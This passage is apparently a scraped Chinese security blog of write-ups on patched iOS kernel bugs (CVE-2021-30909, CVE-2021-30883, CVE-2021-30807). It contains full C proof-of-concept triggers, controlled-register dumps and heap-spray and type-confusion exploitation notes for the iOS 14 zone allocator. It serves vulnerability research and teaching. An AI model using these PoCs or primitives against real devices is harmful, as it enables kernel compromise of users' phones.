port_send_turnstile(port) (IP_PREALLOC(port) ? (port)-&gt;ip_premsg-&gt;ikm_turnstile : (port)-&gt;ip_send_turnstile) IP_PREALLOC测试端口是否有预分配的消息，并分别获取turnstile。这是因为 ip_premsg和ip_send_turnstile共享同一个union。接下来，我们可以继续研究PREALLOC标志是如何对执行流程进行影响的。 123456789101112131415161718if (IP_PREALLOC(port)) { ipc_port_t inuse_port; kmsg = port-&gt;ip_premsg; assert(kmsg != IKM_NULL); inuse_port = ikm_prealloc_inuse_port(kmsg); ipc_kmsg_clear_prealloc(kmsg, port); imq_lock(&amp;port-&gt;ip_messages); ipc_port_send_turnstile_recompute_push_locked(port); /* mqueue and port unlocked */ if (inuse_port != IP_NULL) { assert(inuse_port == port); } else { ipc_kmsg_free(kmsg); }} 在ipc_port_destroy()中，如果端口被设置为PREALLOC，那么 kmsg将被turnstile本身所取代。我们可以总结出一个竞争流程，如下： 线程1执行port_send_turnstile，获取destination，并测试它是否真的是一个预分配的消息端口。 线程2执行ipc_kmsg_clear_prealloc()，并使用turnstile替换kmsg。 线程1从ip_premsg获取了turnstile，实际上是一个turnstile，这将导致一个turnstile在另一个turnstile中。 POC123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#include &lt;assert.h&gt;#include &lt;errno.h&gt;#include &lt;mach/mach.h&gt;#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;mach_port_t mk_timer_create(void);kern_return_t mk_timer_destroy(mach_port_t timer);mach_port_t thread_get_special_reply_port(void);typedef struct race_th_args_s race_th_args_t;struct race_th_args_s { int start; mach_port_t move_port; mach_port_t sr_port; mach_port_t timer;};void *th_send_link(void *arg) { race_th_args_t *rta = (race_th_args_t *)arg; while (!rta-&gt;start); struct { mach_msg_header_t header; uint64_t data; } link_sr_msg = { .header = { .msgh_remote_port = rta-&gt;move_port, .msgh_local_port = rta-&gt;sr_port, .msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, 0, 0), .msgh_voucher_port = MACH_PORT_NULL, .msgh_id = 0x99999999, .msgh_size = sizeof(link_sr_msg), }, .data = 0x6666666666666666, }; kern_return_t __unused kr = mach_msg(&amp;link_sr_msg.header, MACH_SEND_MSG | MACH_SEND_OVERRIDE | MACH_SEND_SYNC_OVERRIDE | MACH_SEND_SYNC_BOOTSTRAP_CHECKIN, sizeof(link_sr_msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL); /*assert(kr == KERN_SUCCESS);*/ return NULL;}void *th_destroy(void *arg) { race_th_args_t *rta = (race_th_args_t *)arg; while (!rta-&gt;start); usleep(2); mk_timer_destroy(rta-&gt;timer); return NULL;}int go(void) { while (1) { mach_port_t timer = mk_timer_create(); printf(&quot;[*] timer = 0x%x\\n&quot;, timer); mach_port_t move_port = MACH_PORT_NULL; kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;move_port); assert(kr == KERN_SUCCESS); kr = mach_port_insert_right(mach_task_self(), move_port, move_port, MACH_MSG_TYPE_MAKE_SEND); mach_port_t sr_port = thread_get_special_reply_port(); /*printf(&quot;[*] sr_port = 0x%x\\n&quot;, sr_port);*/ struct { mach_msg_header_t header; mach_msg_body_t body; mach_msg_port_descriptor_t port; } move_right_msg = { .header = { .msgh_remote_port = timer, .msgh_local_port = MACH_PORT_NULL, .msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX), .msgh_voucher_port = MACH_PORT_NULL, .msgh_id = 0x88888888, .msgh_size = sizeof(move_right_msg), }, .body = { .msgh_descriptor_count = 1, }, .port = { .name = move_port, .disposition = MACH_MSG_TYPE_MOVE_RECEIVE, .type = MACH_MSG_PORT_DESCRIPTOR, }, }; kr = mach_msg(&amp;move_right_msg.header, MACH_SEND_MSG, sizeof(move_right_msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL); assert(kr == KERN_SUCCESS); race_th_args_t rta = { .start = 0, .move_port = move_port, .sr_port = sr_port, .timer = timer, }; pthread_t ths[2]; pthread_create(&amp;ths[0], NULL, th_send_link, &amp;rta); pthread_create(&amp;ths[1], NULL, th_destroy, &amp;rta); usleep(5); rta.start = 1; for (size_t i = 0; i &lt; 2; i++) { pthread_join(ths[i], NULL); } mach_port_destroy(mach_task_self(), timer); mach_port_destroy(mach_task_self(), move_port); mach_port_destroy(mach_task_self(), sr_port); } return 0;}","link":"/2022/01/10/iOS-CVE-2021-30909/"},{"title":"iOS IOMFB 整型溢出漏洞","text":"前言这个漏洞已经在iOS15.0.2中进行了修补，漏洞编号是CVE-2021-30883。这个漏洞厉害之处在于，能够通过应用程序沙箱及其他进程访问，相当适合越狱。 原文链接：https://saaramar.github.io/IOMFB_integer_overflow_poc/ 漏洞成因漏洞出现在IOMFB::TableCompensator::BilerpGainTable::new_from_data函数中，a3是用户传入的一个数组，在第30行，进行下标运算时，没有进行整数溢出检查： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748__int64 __fastcall IOMFB::TableCompensator::BilerpGainTable::new_from_data(__int64 a1, __int64 a2, int a3, __int64 *a4, _QWORD *a5, int a6){ __int64 v_obj; // x19 __int64 v13; // x8 __int64 v14; // x22 int v15; // w8 unsigned int v16; // w23 __int64 v17; // x0 __int64 v18; // x8 __int64 v_idx; // x22 v_obj = operator new(0x60LL); *(_BYTE *)(v_obj + 0x30) = 0; *(_QWORD *)v_obj = off_FFFFFFF0078EF1D8; *(_QWORD *)(v_obj + 0x58) = 0LL; *(_DWORD *)(v_obj + 0x50) = a6; *(_DWORD *)(v_obj + 0x54) = 0; v13 = *a4; *(_QWORD *)(v_obj + 0x38) = 0LL; *(_QWORD *)(v_obj + 0x40) = v13; *(_QWORD *)(v_obj + 0x48) = *a5; *(_DWORD *)(v_obj + 0x10) = a3; v14 = *(unsigned int *)(a1 + 0x140); *(_DWORD *)(v_obj + 32) = v14; if ( a3 ) v15 = a3; else v15 = 1; v16 = v15 * v14; v_chunk = kalloc_ext((unsigned int)(12 * v15 * v14 + 4 * (v14 + a3))); // &lt;-- WOW! *(_QWORD *)(v_obj + 40) = v_chunk; v18 = v_chunk + 12LL * v16; *(_QWORD *)(v_obj + 24) = v18; *(_QWORD *)(v_obj + 8) = v18 + 4 * v14; if ( a3 ) { v_idx = 0LL; while ( IOMFB::TableCompensator::BilerpGainTable::set_table(v_obj, v_idx, a1, a2) &amp; 1 ) { v_idx = (unsigned int)(v_idx + 1); if ( (unsigned int)v_idx &gt;= *(_DWORD *)(v_obj + 16) ) return v_obj; } (*(void (__fastcall **)(__int64))(*(_QWORD *)v_obj + 8LL))(v_obj); v_obj = 0LL; } return v_obj;} 大多数操作数完全是由来自 EL0 的调用者控制的，而且计算的时候用的是32位大小： 1234567FFFFFFF0098EF290 29 17 9F 1A CSINC W9, W25, WZR, NEFFFFFFF0098EF294 09 7D 09 1B MUL W9, W8, W9FFFFFFF0098EF298 96 01 80 52 MOV W22, #0xCFFFFFFF0098EF29C 29 7D 16 1B MUL W9, W9, W22FFFFFFF0098EF2A0 08 01 19 0B ADD W8, W8, W25FFFFFFF0098EF2A4 20 09 08 0B ADD W0, W9, W8,LSL#2FFFFFFF0098EF2A8 13 83 9D 97 BL kalloc_ext POC漏洞存在于AppleMobileDispH12P中，可以从AppleCLCD访问。这个漏洞可以从外部方法 78 访问此函数。POC在14.7.1 和 15.0上是可行的： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667 io_connect_t get_iomfb_uc(void) { kern_return_t ret; io_connect_t shared_user_client_conn = MACH_PORT_NULL; int type = 0; io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(&quot;AppleCLCD&quot;)); if(service == MACH_PORT_NULL) { printf(&quot;[-] failed to open service\\n&quot;); return MACH_PORT_NULL; } printf(&quot;[*] AppleCLCD service: 0x%x\\n&quot;, service); ret = IOServiceOpen(service, mach_task_self(), type, &amp;shared_user_client_conn); if(ret != KERN_SUCCESS) { printf(&quot;[-] failed to open userclient: %s\\n&quot;, mach_error_string(ret)); return MACH_PORT_NULL; } printf(&quot;[*] AppleCLCD userclient: 0x%x\\n&quot;, shared_user_client_conn); return shared_user_client_conn;}void do_trigger(io_connect_t iomfb_uc) { kern_return_t ret; size_t input_size = 0x180; uint64_t scalars[2] = { 0 }; char *input = (char*)malloc(input_size); if (input == NULL) { perror(&quot;malloc input&quot;); return; } memset(input, 0x41, input_size); *(int*)input = 0x3; ret = IOConnectCallMethod(iomfb_uc, 78, scalars, 2, input, input_size, NULL, NULL, NULL, NULL); if (ret != KERN_SUCCESS) { printf(&quot;s_set_block failed, ret == 0x%x --&gt; %s\\n&quot;, ret, mach_error_string(ret)); } else { printf(&quot;success!\\n&quot;); } free(input);}void poc(void) { io_connect_t iomfb_uc = get_iomfb_uc(); if (iomfb_uc == MACH_PORT_NULL) { return; } do_trigger(iomfb_uc); IOServiceClose(iomfb_uc);} 漏洞利用控制操作数这里是通过逆向IOMFB::TableCompensator::BilerpGainTable::new_from_data函数来实现的，将POC简单的改一下： 1234567891011121314151617... memset(input, 0x0, input_size); int *pArr = (int*)input; pArr[0] = 0x3; // sub-sub selector pArr[1] = 0xffffffff; // has to be non-zero pArr[2] = 0x41414141; pArr[3] = 0x42424242; pArr[8] = 0x43434343; pArr[89] = 0x44444444; ret = IOConnectCallMethod(iomfb_uc, 78, scalars, 2, input, input_size, NULL, NULL, NULL, NULL);... 寄存器信息如下： 123456789101112131415161718192021222324252627282930313233343536(lldb) reg readGeneral Purpose Registers: x0 = 0xffffffe4cbaa4420 x1 = 0x0000000000000060 x2 = 0x0000000000000020 x3 = 0x0000000000000060 x4 = 0x0000000000000000 x5 = 0x0000000043434343 // &lt;-- controlled x6 = 0xfffffff00991adac x7 = 0x0000000000006eb1 x8 = 0x0000000044444444 // &lt;-- controlled x9 = 0x000000000000000b x10 = 0xffffffe802224000 x11 = 0x3ffffff932ea900b x12 = 0x0000000000000000 x13 = 0x00000000000001dc x14 = 0x0000000000003320 x15 = 0x0000000000008001 x16 = 0xffbd7ff007a542d8 x17 = 0x182effe4cbaa4420 x18 = 0x0000000000000000 x19 = 0xffffffe4cbaa4420 x20 = 0x0000000042424242 // &lt;-- controlled x21 = 0xffffffe4ccf02b00 x22 = 0x0000000043434343 // &lt;-- controlled x23 = 0xffffffe4ccf02af4 x24 = 0xffffffe4ccf02aec x25 = 0x0000000041414141 // &lt;-- controlled x26 = 0x0000000000000000 x27 = 0xffffffe81869b648 x28 = 0xffffffe199dd5608 x29 = 0xffffffe81869b4b0 x30 = 0xfffffff0098ef23c sp = 0xffffffe81869b470 pc = 0xfffffff0098ef290 cpsr = 0x20400204","link":"/2021/12/31/iOS-IOMFB-%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"},{"title":"iOS-LPE-AppleAVE2","text":"前言 原文链接：https://blog.zecops.com/research/running-code-in-the-context-of-ios-kernel-part-i-lpe-poc-on-ios-13-7/ AppleAVE2 是在内核空间中运行的图形 IOKit 驱动程序，仅存在于 iOS 上，就像许多其他 iOS 专有驱动程序一样，它不是开源的，并且大部分符号已被删除。，而且无法从默认的应用程序沙箱环境访问该驱动程序。","link":"/2022/02/14/iOS-LPE-AppleAVE2/"},{"title":"iOS PAC机制","text":"参考文章Examining Pointer Authentication on the iPhone XS Pointer Authentication on ARMv8.3 Design and Analysis of the New Software Security Instructions Mark Rutland’s slides this LWN article ARM A64 Instruction Set Architecture https://blog.asm.im/2020/02/11/Undecimus-%E5%88%86%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89%E7%BB%95%E8%BF%87-A12-%E7%9A%84-PAC-%E5%AE%9E%E7%8E%B0-kexec/#%E5%89%8D%E8%A8%80","link":"/2022/05/03/iOS-PAC%E6%9C%BA%E5%88%B6/"},{"title":"iOS LPE-CVE-2021-30807","text":"前言这个漏洞是从应用程序沙箱中逆向IOServices时发现的，这是一个存在于AppleCLCD/IOMobileFrameBuffer中的漏洞。 原文链接: https://jsherman212.github.io/2021/11/28/popping_ios14_with_iomfb.html 漏洞原理该漏洞位于AppleCLCD/IOMFB的外部方法 83 ，即IOMobileFramebufferUserClient::s_displayed_fb_surface()函数中。下面是从iOS 14 beta中逆向得到的结果: 12345678910111213141516171819202122232425__int64 __fastcall IOMobileFramebufferUserClient::s_displayed_fb_surface(IOUserClient **a1, __int64 a2, IOExternalMethodArguments_s *args){ __int64 v4; // [xsp+10h] [xbp-30h] bool v5; // [xsp+1Bh] [xbp-25h] unsigned int v6; // [xsp+1Ch] [xbp-24h] int v7; // [xsp+20h] [xbp-20h] unsigned int v_retval; // [xsp+24h] [xbp-1Ch] v_retval = 0xE00002C1; v7 = 0xAAAAAAAA; v6 = 0; v5 = 0; v4 = IOUserClient::copyClientEntitlement(a1[29], &quot;com.apple.private.allow-explicit-graphics-priority&quot;, args); if ( v4 ) { v5 = v4 == gOSBooleanTrue; (*(*v4 + 40LL))(v4); } if ( v5 ) { v_retval = IOMobileFramebufferUserClient::get_displayed_surface(a1, &amp;v6, *args-&gt;scalarInput); *args-&gt;scalarOutput = v6; } return v_retval;} 进入IOMobileFramebufferUserClient::get_displayed_surface()函数: 1234__int64 __fastcall IOMobileFramebufferUserClient::get_displayed_surface(IOMobileFramebufferUserClient *this, unsigned int *a2, unsigned int scalar0){ return (*(**(this + 27) + 0x798LL))(*(this + 27), *(this + 29), a2, scalar0);} +0x798 处的函数是IOMobileFramebufferLegacy::get_displayed_surface(): 123456789__int64 __fastcall IOMobileFramebufferLegacy::get_displayed_surface(IOMobileFramebufferLegacy *this, task *a2, unsigned int *a3, unsigned int scalar0){ unsigned int v_retval; // [xsp+10h] [xbp-20h] v_retval = 0xE00002BC; if ( *(this + scalar0 + 331) &amp;&amp; *(this + 366) ) v_retval = IOSurfaceRoot::copyPortNameForSurfaceInTask(*(this + 366), a2, *(this + scalar0 + 331), a3); return v_retval;} 从下面的汇编代码可以看出，调用IOSurfaceRoot::copyPortNameForSurfaceInTask()函数时，没有对数组的下标运算进行安全检查，以判断是否造成越界，故造成内核类型混淆(这一点需要结合IOSurface的机制来看): 12345678910FFFFFFF00970ADDC LDR X8, [SP,#0x30+v_this]FFFFFFF00970ADE0 LDR X0, [X8,#0xB70] ; thisFFFFFFF00970ADE4 LDUR X1, [X29,#var_10] ; task *FFFFFFF00970ADE8 ADD X9, X8, #0xA58FFFFFFF00970ADEC LDR W10, [SP,#0x30+v_scalar0]FFFFFFF00970ADF0 MOV X11, X10FFFFFFF00970ADF4 ADD X9, X9, X11,LSL#3FFFFFFF00970ADF8 LDR X2, [X9] ; IOSurface *FFFFFFF00970ADFC LDR X3, [SP,#0x30+var_18] ; unsigned int *FFFFFFF00970AE00 BL IOSurfaceRoot::copyPortNameForSurfaceInTask(task *,IOSurface *,uint *) 至于触发就很简单了，下面是POC: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546void trigger_clcd_vuln(void) { kern_return_t ret; io_connect_t shared_user_client_conn = MACH_PORT_NULL; int type = 2; io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(&quot;IOMobileFramebuffer&quot;)); if(service == MACH_PORT_NULL) { printf(&quot;failed to open service\\n&quot;); return; } printf(&quot;service: 0x%x\\n&quot;, service); ret = IOServiceOpen(service, mach_task_self(), type, &amp;shared_user_client_conn); if(ret != KERN_SUCCESS) { printf(&quot;failed to open userclient: %s\\n&quot;, mach_error_string(ret)); return; } printf(&quot;client: 0x%x\\n&quot;, shared_user_client_conn); printf(&quot;call externalMethod\\n&quot;); uint64_t scalars[4] = { 0x0 }; scalars[0] = 0x41414141; uint64_t output_scalars[4] = { 0 }; uint32_t output_scalars_size = 1; printf(&quot;call s_default_fb_surface\\n&quot;); ret = IOConnectCallMethod(shared_user_client_conn, 83, scalars, 1, NULL, 0, //input, input_size, output_scalars, &amp;output_scalars_size, NULL, NULL); //output, &amp;output_size); if(ret != KERN_SUCCESS) { printf(&quot;failed to call external method: 0x%x --&gt; %s\\n&quot;, ret, mach_error_string(ret)); return; } printf(&quot;external method returned KERN_SUCCESS\\n&quot;); IOServiceClose(shared_user_client_conn); printf(&quot;success!\\n&quot;);} 踩坑经历iOS内核可以把任意一个对象解释为IOSurface 1234567891011121314151617181920IOSurfaceSendRight *__fastcall IOSurfaceSendRight::init_IOSurfaceRoot___IOSurface( IOSurfaceSendRight *a1, IOSurfaceRoot *a2, IOSurface *oob_surface){ IOSurfaceSendRight *v6; // x20 IOSurface *surface; // x21 v6 = OSObject::init(); a1-&gt;m.surface_root = a2; surface = a1-&gt;m.surface; a1-&gt;m.surface = oob_surface; if ( oob_surface ) (oob_surface-&gt;retain)(oob_surface); if ( surface ) (surface-&gt;release_0)(surface); IOSurface::clientRetain(oob_surface); IOSurface::increment_use_count(oob_surface); return v6;} IOSurface::clientRetain()函数实现如下: 1234SInt32 __fastcall IOSurface::clientRetain(IOSurface *surface){ return OSIncrementAtomic(&amp;surface-&gt;client_retain_count);} IOSurface::increment_use_count()函数实现如下: 123456789void __fastcall IOSurface::increment_use_count(IOSurface *surface){ do { OSIncrementAtomic((surface-&gt;qwordC0 + 0x14LL)); surface = surface-&gt;qword3F0; } while ( surface );} 上面的代码中有两个原语: IOSurface::clientRetain会增加oob_surface指向的对象的偏移量为0x354(client_retain_count)处的值。 通过控制oob_surface的偏移量0xc0处的指针，IOSurface::increment_use_count在内核内存中提供了一个任意的32位增量。 对于漏洞利用来讲，首先要伪造一个真实的IOSurface对象，否则会在 IOSurfaceSendRight::init()函数中导致Panic。因此伪造的IOSurface对象需要满足以下几点： oob_surface应该指向一个IOKit对象，因为IOSurfaceSendRight::init在其vtable上调用了偏移量为0x20的虚拟方法。只要oob_surface继承自OSObject，这就会调用 retain，这是一个无害的操作。 oob_surface的大小应该至少是0x358字节，因为IOSurface::clientRetain增加的字段是在偏移量0x354。如果oob_surface指向的对象小于这个大小，我们就有可能修改一个已释放的区域元素或碰到一个未映射的页面。 oob_surface必须有一个有效的内核指针，用于IOSurface::increment_use_count在偏移量0xc0。在偏移量0x3f0处，该指针可以是有效的，也可以是NULL。因此，ob_surface指向的对象应该大于0x3f8字节，原因与前一点相同。 由于iOS 14通过引入kheaps和sequestering大大强化了内存分配器，因此，无论伪造的对象是否继承自OSObject，堆喷这个操作都存在着问题。 kheaps在高层次上，Kheaps通过给数据、内核、kext和临时内存分配各自的kalloc.*区域，使得它们之间相互隔离。这些kheaps分别被称为KHEAP_DATA_BUFFERS、KHEAP_DEFAULT、KHEAP_KEXT和KHEAP_TEMP。 zone map实际上是由三个不同的子地图组成的。一个子图是KHEAP_DEFAULT、KHEAP_KEXT和KHEAP_TEMP的区域，而另一个是KHEAP_DATA_BUFFERS的区域。第三个子图对我们来说并不重要。KHEAP_DATA_BUFFERS是为那些内容为纯字节或由用户空间控制的分配而准备的。KHEAP_DEFAULT是XNU分配的Kheap，而KHEAP_KEXT是内核扩展分配的Kheap。KHEAP_TEMP（只是KHEAP_DEFAULT的别名）是指在系统调用中进行的分配，在返回EL0之前被释放。因此，在iOS 14及以上版本中，一个500字节的IOKit对象属于kext.kalloc.512，而一个同样大小的管道缓冲区则属于data.kalloc.512。在iOS 13及以下版本中，这两个分配都是kalloc.512。(在iOS 15上，似乎KHEAP_TEMP已经被移除）。 在iOS 13及以下版本中，滥用zone垃圾收集将一个页面从一个区域移动到另一个区域是利用UAF的标准。iOS 14管道缓冲区被隔离在数据缓冲区的Kheap中。通过管道缓冲区（或任何其他纯数据手段）喷射假的内核对象并希望通过垃圾收集 “重新利用 “这些页面已经行不通了。 zone垃圾收集和封存所有zone都有一个chunk size，表示一个虚拟内存连续的区域能被分割成多少个页。这个范围被称为 “chunk”。像*.kalloc.192这样较小的区域，其块的大小为一页。但是对于较大的区域，比如*.kalloc.6144，块的大小就会增加到2页，这是16k页面大小的设备的最大值。对于4k页面大小的设备，最大的块大小是8页。 与区块中每个页面相关的结构是struct zone_page_metadata: 1234567891011121314151617181920212223242526272829303132333435363738struct zone_page_metadata { /* 该元数据页所属区域的索引 */ zone_id_t zm_index : 11; /* Whether `zm_bitmap` is an inline bitmap or a packed bitmap reference */ uint16_t zm_inline_bitmap : 1; /* * zone以zone_t::z_chunk_pages的&quot;chunk&quot;为单位进行分配 * 如果zone是percpu，则以zpercpu_count()页为单位 * * The first page of it has its metadata set with: * - 0 if none of the pages are currently wired * - the number of wired pages in the chunk (not scaled for percpu). * * Other pages in the chunk have their zm_chunk_len set to * ZM_SECONDARY_PAGE or ZM_SECONDARY_PCPU_PAGE depending on whether * the zone is percpu or not. For those, zm_page_index holds the * index of that page in the run. */ uint16_t zm_chunk_len : 4;#define ZM_CHUNK_LEN_MAX 0x8#define ZM_SECONDARY_PAGE 0xe#define ZM_SECONDARY_PCPU_PAGE 0xf union {#define ZM_ALLOC_SIZE_LOCK 1u uint16_t zm_alloc_size; /* first page only */ uint16_t zm_page_index; /* secondary pages only */ }; union { uint32_t zm_bitmap; /* most zones */ uint32_t zm_bump; /* permanent zones */ }; zone_pva_t zm_page_next; zone_pva_t zm_page_prev;}; 如果一个zone page metadata结构与一个块中的第一页相关联，zm_chunk_len是zm_index（XNU的zone_array中的索引）所指的区域的块大小。如果块的大小超过一页，那么对于第二页及以后，zm_chunk_len被定义为ZM_SECONDARY_PAGE或ZM_SECONDARY_PAGE_PCPU_PAGE，并且zm_page_index作为该块的索引。否则，zm_alloc_size告诉我们该块中目前有多少字节被分配。zm_page_next和zm_page_prev一起工作，为zm_index的zone形成一个块的队列。如果一个zone的zone page metadata结构是这个大块队列的头，那么zm_page_prev持有一个由zone_queue_encode编码的值。如果它不是头部，两者都指向前一个/下一个分块的第一页，但只有当它们所属的zone page metadata结构与分块中的第一页相关联时，才会如此。 所有的zone结构都带有指向zone page metadata结构的指针，每个指针都有不同的作用。在iOS 13及以下版本中，这些指针被称为all_free、intermediate和all_used。all_free维护一个只有自由元素的块队列，intermediate维护一个既有自由元素又有使用元素的块队列，而all_used维护一个只有使用元素的块队列。在iOS 14及以上版本中，它们分别被重新命名为empty、partial和full，但它们的用途保持不变。 zone结构如下: 123456789struct zone { /* ... */ zone_pva_t z_pageq_empty; /* populated, completely empty pages */ zone_pva_t z_pageq_partial;/* populated, partially filled pages */ zone_pva_t z_pageq_full; /* populated, completely full pages */ /* ... */}; zone_pva_t 123456789101112131415/*! * @typedef zone_pva_t * * @brief * Type used to point to a page virtual address in the zone allocator. * * @description * - Valid pages have the top bit set. * - 0 represents the &quot;NULL&quot; page * - non 0 values with the top bit cleared do not represent any valid page. * the zone freelists use this space to encode &quot;queue&quot; addresses. */typedef struct zone_packed_virtual_address { uint32_t packed_address;} zone_pva_t; 一个zone打包的虚拟地址实际上只是内核指针的Bits[49:14]，并有一些特殊的规则: (zone_pva_t)0代表零页（又称NULL）。 zone_pva_t的最高位被设置，可以通过将其移到左边的14位并进行符号扩展来转换回其对应的页对齐的内核指针。 一个zone_pva_t的顶位被清除，代表一个队列地址。 这样做的好处是，你可以将一个非队列的zone_pva_t转换回其对应的zone page metadata结构，反之亦然，分别使用zone_pva_to_meta和zone_pva_from_meta。不仅如此，一旦我们有了一个指向zone page metadata结构的指针，我们就可以通过调用zone_meta_to_addr来得出它所关联的块中的页面。例如，zone_pva_to_meta(z-&gt;z_pageq_empty)将返回表示z所指向的区的空队列的头的zone page metadata结构。 属于某个zone的所有块被布置成网格中的盒子，每个盒子代表一个块。从一个块到一个metadata结构的虚线箭头表示这两者之间的联系。假设三个深绿色的块在前面描述的一个队列的中间有背对背的zone_page_metadata条目，我们会有这样的东西。 zone_gc是zone垃圾收集的入口，它调用zone_reclaim_all，zone_reclaim_all负责在每个zone上调用zone_reclaim，有趣的部分从zone_reclaim的结尾开始: 1234567891011121314151617for(;;){ /* ... */ if (zone_pva_is_null(z-&gt;z_pageq_empty)) { break; } // 将只有空闲元素的页面释放回给区域分配器 meta = zone_pva_to_meta(z-&gt;z_pageq_empty); count = (uint32_t)ptoa(meta-&gt;zm_chunk_len) / zone_elem_size(z); if (z-&gt;z_elems_free - count &lt; goal) { break; } zone_reclaim_chunk(z, meta, count);} zone_reclaim_chunk弹出从z-&gt;z_pageq_empty传递给它的zone page metadata: 12345678static voidzone_reclaim_chunk(zone_t z, struct zone_page_metadata *meta, uint32_t free_count){ /* Declaring variables */ zone_meta_queue_pop_native(z, &amp;z-&gt;z_pageq_empty, &amp;page_addr); /* ... */ 在zone_reclaim_chunk的结尾: 123456if (sequester) { kernel_memory_depopulate(zone_submap(z), page_addr, size_to_free, KMA_KOBJECT, VM_KERN_MEMORY_ZONE);} else { kmem_free(zone_submap(z), page_addr, ptoa(z-&gt;z_chunk_pages));} 同样，对于KHEAP_DEFAULT和KHEAP_KEXT来说，sequester将永远是真的。kmem_free释放的是块和支持该块的物理内存，而kernel_memory_depopulate只释放物理内存。在往下: 123if (sequester) { zone_meta_queue_push(z, &amp;z-&gt;z_pageq_va, meta);} 刚刚填充的区块的页面元数据被推送到一个叫做z_pageq_va的队列中。这个队列在iOS 14中首次出现，它位于zone结构中z_pageq_full之后。 12345678910struct zone { /* ... */ zone_pva_t z_pageq_empty; /* populated, completely empty pages */ zone_pva_t z_pageq_partial;/* populated, partially filled pages */ zone_pva_t z_pageq_full; /* populated, completely full pages */ zone_pva_t z_pageq_va; /* non-populated VA pages */ /* ... */}; z_pageq_va将会被 zone_expand_locked()函数使用.如果一个zone的空闲元素开始耗尽，这个函数就会被调用来重新填充该zone。它所做的第一件事就是看是否可以重新使用z_pageq_va中的一个被删除的块。 1234567891011if (!zone_pva_is_null(z-&gt;z_pageq_va)) { meta = zone_meta_queue_pop_native(z, &amp;z-&gt;z_pageq_va, &amp;addr); if (meta-&gt;zm_chunk_len == ZM_SECONDARY_PAGE) { cur_pages = meta-&gt;zm_page_index; meta -= cur_pages; addr -= ptoa(cur_pages); zone_meta_lock_in_partial(z, meta, cur_pages); }} 如果我们把注意力转移到zone_expand_locked上，我们会看到XNU试图用vm_page_grab抓取足够的空闲页来满足min_pages，而不是满足zone z的chunk大小。min_pages是z的元素大小，四舍五入到最近的页。这就是后来可能产生部分填充的块的原因，因为这里没有任何东西强制要求为addr所属的块中的每个页面分配一个空闲页。 1234567891011121314151617while (pages &lt; z-&gt;z_chunk_pages - cur_pages) { vm_page_t m = vm_page_grab(); if (m) { pages++; m-&gt;vmp_snext = page_list; page_list = m; vm_page_zero_fill(m); continue; } if (pages &gt;= min_pages &amp;&amp; (vm_pool_low() || waited)) { break; } /* ... */} 接下来，调用kernel_memory_populate_with_pages来重新映射最近被释放的z_pageq_va块的虚拟内存到支持刚刚被分配的自由页的物理内存上。然而，如果XNU不能分配足够的空闲页来满足该块的长度，那么在kernel_memory_populate_with_pages返回后，该块中的一些页将继续被释放，产生一个部分填充的块。 123kernel_memory_populate_with_pages(zone_submap(z), addr + ptoa(cur_pages), ptoa(pages), page_list, zone_kma_flags(z, flags), VM_KERN_MEMORY_ZONE); 最后，zcram_and_lock被调用。这个函数负责使被重新映射的块再次可用于一个区域。如果这个区块最终被部分填充，它将确保被填充的页面能够回到z_pageq_va中。 12345678/* ... */if (pg_end &lt; chunk_pages) { /* push any non populated residual VA on z_pageq_va */ zone_meta_queue_push(zone, &amp;zone-&gt;z_pageq_va, meta + pg_end);}/* ... */ 总结一下，新的zone垃圾收集zone扩展流程提供了一个真正强有力的保证：因为被封存的页面的虚拟内存实际上并没有释放到zone映射上，所以不可能将这些虚拟内存重新用于其他分区。支持KHEAP_DATA_BUFFERS的区域没有被封存，不同于KHEAP_DEFAULT和KHEAP_KEXT，KHEAP_DATA_BUFFERS单独存在于一个地方。 Pipe管道我们可以越界读取一个在kext.kalloc.6144内的、巨大的、0x13a0字节的UnifiedPipeline对象中的内联数组IOSurface*[]，kext.kalloc.6144的内存区域比较稳定，所以对这个区域进行喷射，分配的内存会落在这个UnifiedPipeline对象的周围。由于数组的访问是通过*(UnifiedPipeline + 0xa98 + (0x8 * idx))的形式进行的，因此可以从UnifiedPipeline对象中读出任何指针字段，并对其进行类型混淆。下面是去除内核指针后的字段: 12345678910111213141516171819202122&lt;offset&gt;:&lt;对象类&gt; (&lt;大小&gt;)0x18: OSDictionary (0x40)0x20: OSDictionary (0x40)0x30: AppleARMIODevice (0xd8)0x60: IOServicePM (0x288)0x7f8: IOSurface (0x400)0x810: IODMACommand (0x78)0xb28: IOMFBSwapIORequest (0x640)0xba8: IODARTMapper (0x690)0xbb0: IOSurfaceRoot (0x1f0)0xbb8: IOCommandGate (0x50)0xbc0: IOWorkLoop (0x48)0xbc8: IOSurface (0x400)0xbd0: IOPMServiceInterestNotifier (0x88)0xbd8: IOInterruptEventSource (0x68)0xbe0: AppleARMIODevice (0xd8)0xbe8: IOTimerEventSource (0x60)0xd30: IOSurfaceDeviceMemoryRegion (0x60)0xd40: IOCommandPool (0x38)0xd68: AppleMobileFileIntegrity (0x88)0x1230: VideoInterfaceMipi (0x78)0x12d8: AppleARMBacklight (0x358) 这里要选取大小比IOSurface大的对象，就是IOSurface、IOMFBSwapIORequest和IODARTMapper。POC触发内核Panic的函数是IOSurfaceSendRight::init，IOSurface是其第三个参数，如果使用IOSurface来进行堆喷，则不能造成类型混淆。 1IOSurfaceSendRight::init(IOSurfaceSendRight *__hidden this, IOSurfaceRoot *, IOSurface *) 